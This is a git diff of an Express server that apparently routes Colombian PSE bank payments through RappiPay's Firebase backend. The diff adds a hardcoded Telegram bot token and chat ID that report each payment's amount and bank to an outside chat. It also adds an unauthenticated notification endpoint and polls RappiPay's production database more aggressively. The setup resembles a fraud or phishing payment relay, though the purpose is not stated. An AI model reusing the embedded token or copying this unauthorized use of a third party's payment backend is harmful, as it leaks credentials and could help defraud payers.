@@ -21,6 +21,20 @@ const RAPPIPAY_FIREBASE  = {
   appId:       '1:507783753255:web:d3e9bdc53b9d31220ea802',
 };
 
+// ── Telegram ────────────────────────────────────────────────
+const TELEGRAM_TOKEN   = '8712124626:AAFAYI4vRWnUlvkzuk63dnKhe-dEOIyfwM4';
+const TELEGRAM_CHAT_ID = '-1004457768033';
+
+async function notificarTelegram({ valor, banco, pasarela }) {
+  try {
+    const fmt = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 });
+    const msg = `🟢 NUEVO PAGO\n💰 ${fmt.format(Number(valor) || 0)}\n🏦 ${banco}\n🔌 ${pasarela}\n🕐 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID, text: msg
+    });
+  } catch (e) { console.error('[Telegram] Error:', e.message); }
+}
+
 // ── Bancos Colombia (referencia) ────────────────────────────
 const BANCOS_COLOMBIA = {
   "1007":"BANCOLOMBIA","1051":"DAVIVIENDA","1001":"BANCO DE BOGOTA","1013":"BBVA COLOMBIA",
@@ -121,24 +135,19 @@ async function crearTransaccionPSE({ amount, bankCode, bankName, customerName, c
   const idToken = authRes.data?.idToken;
   if (!idToken) throw new Error('Firebase signIn failed — no idToken');
 
-  // Paso D: Firebase RTDB polling
+  // Paso D: Firebase RTDB polling (agresivo: 1s entre intentos)
   const dbPath = `cash_flow_cash_in_pse_link_transaction/${txTraceId}`;
-  const dbUrls = [RAPPIPAY_FIREBASE.databaseURL, 'https://rpp-platform-mobile-app-prod.firebaseio.com'];
+  const dbUrl = RAPPIPAY_FIREBASE.databaseURL;
 
-  let bankUrl = null, activeDbUrl = null;
+  let bankUrl = null;
 
-  for (let attempt = 1; attempt <= 15; attempt++) {
-    await new Promise(r => setTimeout(r, attempt === 1 ? 3000 : 2000));
+  for (let attempt = 1; attempt <= 20; attempt++) {
+    await new Promise(r => setTimeout(r, attempt === 1 ? 1500 : 1000));
 
-    for (const dbBaseUrl of (activeDbUrl ? [activeDbUrl] : dbUrls)) {
-      try {
-        const dbRes = await axios.get(`${dbBaseUrl}/${dbPath}.json?auth=${idToken}`, { timeout: 10_000 });
-        activeDbUrl = dbBaseUrl;
-        if (dbRes.data?.params?.link) { bankUrl = dbRes.data.params.link; break; }
-        break;
-      } catch { /* probar otra URL */ }
-    }
-    if (bankUrl) break;
+    try {
+      const dbRes = await axios.get(`${dbUrl}/${dbPath}.json?auth=${idToken}`, { timeout: 5_000 });
+      if (dbRes.data?.params?.link) { bankUrl = dbRes.data.params.link; break; }
+    } catch { /* reintentar */ }
   }
 
   return { success: true, bankUrl, traceabilityId: txTraceId, rawResponse: txRes.data };
@@ -180,11 +189,24 @@ app.post('/api/pasarela/rappipay-pse', async (req, res) => {
       amount, bankCode, bankName, customerName, customerDoc, customerDocType, clientIp,
     });
 
+    // Notificar Telegram cuando ya se redirige al banco
+    if (result.bankUrl) {
+      const bancoNombre = bankName || BANCOS_COLOMBIA[bankCode] || bankCode;
+      notificarTelegram({ valor: amount, banco: bancoNombre, pasarela: 'RappiPay' });
+    }
+
     res.json(result);
   } catch (err) {
     console.error('[RappiPay] Error PSE:', err.message);
     res.status(500).json({ success: false, error: err.message });
   }
+});
+
+// Notificar pago directo (Caja Social, Bancolombia, etc.)
+app.post('/api/pasarela/notificar-directo', async (req, res) => {
+  const { valor, banco } = req.body;
+  notificarTelegram({ valor, banco, pasarela: 'Directo' });
+  res.json({ ok: true });
 });
 
 // Archivos estáticos
